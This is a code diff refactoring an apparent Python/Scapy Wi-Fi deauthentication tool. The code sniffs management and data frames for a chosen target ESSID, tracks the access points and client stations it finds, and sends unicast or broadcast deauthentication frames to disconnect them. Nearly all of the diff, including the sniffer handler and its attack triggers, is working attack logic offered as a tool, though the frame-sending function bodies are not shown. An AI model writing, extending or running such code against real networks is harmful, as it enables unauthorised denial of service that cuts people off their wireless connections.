@@ -30,19 +30,46 @@ class MsgException(Exception):
     def __str__(self):
         return f'[!] Error! {self.message}:\n    {self.exception}'
 
-def bssids_whitelist_type(bssids_whitelist_string):
-    '''comma-separated bssids whitelist parsing'''
+class APs:
+    def __init__(self):
+        self.bssids = set()
     
-    try:
-        bssids_whitelist = set()
-        bssids_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
-        for bssid in bssids_whitelist_string.split(','):
+    def __contains__(self, bssid):
+        return bssid in self.bssids
+    
+    def add(self, bssid, essid):
+        self.bssids.add(bssid)
+        print_info(
+            f'AP detected for network {essid}'
+            f'\n    access point = {bssid}'
+        )
+
+class STAs:
+    def __init__(self):
+        self.bssids = {} # {bssid_sta: bssid_ap}
+    
+    def get(self, bssid_sta):
+        return self.bssids.get(bssid_sta)
+    
+    def update(self, bssid_sta, bssid_ap, essid):
+        self.bssids.update({bssid_sta: bssid_ap})
+        print_info(
+            f'STA detected for network {essid}'
+            f'\n    station      = {bssid_sta}'
+            f'\n    access point = {bssid_ap}'
+        )
+
+class APs_whitelist:
+    def __init__(self, bssids_string):
+        self.bssids = set()
+        self.bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
+        for bssid in bssids_string.split(','):
             bssid = bssid.strip().lower()
-            if bssids_regex.match(bssid):
-                bssids_whitelist.add(bssid)
-    except Exception as e:
-        raise MsgException(e, 'Comma-separated BSSIDs whitelist could not be processed')
-    return bssids_whitelist
+            if self.bssid_regex.match(bssid):
+                self.bssids.add(bssid)
+    
+    def __contains__(self, bssid):
+        return bssid in self.bssids
 
 def panic(msg_exception):
     '''exception handling'''
@@ -85,31 +112,6 @@ def get_src_dst_network(frame):
     except Exception as e:
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
-
-def register_ap(wifi_essid, bssid_ap, bssids_aps):
-    '''ap registration'''
-    
-    try:
-        bssids_aps.add(bssid_ap)
-        print_info(
-            f'AP detected for network {wifi_essid}'
-            f'\n    access point = {bssid_ap}'
-        )
-    except Exception as e:
-        raise MsgException(e, 'Detected access point could not be registered')
-
-def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
-    '''sta registration'''
-    
-    try:
-        bssids_stas_dict.update({bssid_sta: bssid_ap})
-        print_info(
-            f'STA detected for network {wifi_essid}'
-            f'\n    station      = {bssid_sta}'
-            f'\n    access point = {bssid_ap}'
-        )
-    except Exception as e:
-        raise MsgException(e, 'Detected station could not be registered')
 
 def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
@@ -160,7 +162,7 @@ def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps, bssids_stas_dict):
+def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_waves, aps_whitelist, access_points, stations):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -170,12 +172,12 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
                 if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
-                    if (bssid_src not in bssids_whitelist) and (bssid_src not in bssids_aps):
+                    if (bssid_src not in aps_whitelist) and (bssid_src not in access_points):
                         dot11_element = frame.getlayer(dot11.Dot11Elt)
                         while dot11_element:
                             if dot11_element.ID == 0:
-                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
-                                    register_ap(wifi_essid, bssid_src, bssids_aps)
+                                if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
+                                    access_points.add(bssid_src, essid)
                                     if broadcast_enabled:
                                         broadcast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_network)
                                 break
@@ -183,12 +185,12 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type mgt subtype probe-req
                 elif frame.haslayer(dot11.Dot11ProbeReq):
-                    if (bssid_dst not in bssids_whitelist) and is_unicast(bssid_dst) and (bssid_dst not in bssids_aps):
+                    if (bssid_dst not in aps_whitelist) and is_unicast(bssid_dst) and (bssid_dst not in access_points):
                         dot11_element = frame.getlayer(dot11.Dot11Elt)
                         while dot11_element:
                             if dot11_element.ID == 0:
-                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
-                                    register_ap(wifi_essid, bssid_dst, bssids_aps)
+                                if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
+                                    access_points.add(bssid_dst, essid)
                                     if broadcast_enabled:
                                         broadcast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_network)
                                 break
@@ -196,11 +198,11 @@ def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves,
                 
                 # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                 else:
-                    if (bssid_src in bssids_aps) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
-                        register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
+                    if (bssid_src in access_points) and (stations.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
+                        stations.update(bssid_dst, bssid_src, essid)
                         unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
-                    elif (bssid_dst in bssids_aps) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
-                        register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
+                    elif (bssid_dst in access_points) and (stations.get(bssid_src) != bssid_dst):
+                        stations.update(bssid_src, bssid_dst, essid)
                         unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
         
         except Exception as e:
@@ -229,7 +231,7 @@ def main():
         )
         parser.add_argument(
             '-e',
-            dest = 'wifi_essid',
+            dest = 'essid',
             help = 'target Wi-Fi ESSID',
             required = True,
         )
@@ -250,10 +252,10 @@ def main():
         )
         parser.add_argument(
             '-wl',
-            dest = 'bssids_whitelist',
+            dest = 'aps_whitelist',
             help = 'comma-separated BSSIDs whitelist',
             required = False,
-            type = bssids_whitelist_type,
+            type = APs_whitelist,
             default = [],
         )
         args = parser.parse_args()
@@ -264,19 +266,19 @@ def main():
             'wlan type ctl',
             'wlan type data',
         ]
-        bssids_aps = set()
-        bssids_stas_dict = {} # {sta bssid: ap bssid}
+        access_points = APs()
+        stations = STAs()
         sendrecv.sniff(
             iface = args.wifi_interface,
             filter = ' or '.join(filters),
             prn = sniffer_wrapper(
                 args.wifi_interface,
-                args.wifi_essid,
+                args.essid,
                 args.broadcast_enabled,
                 args.deauth_waves,
-                args.bssids_whitelist,
-                bssids_aps,
-                bssids_stas_dict,
+                args.aps_whitelist,
+                access_points,
+                stations,
             ),
         )
     except MsgException as msg_exception:
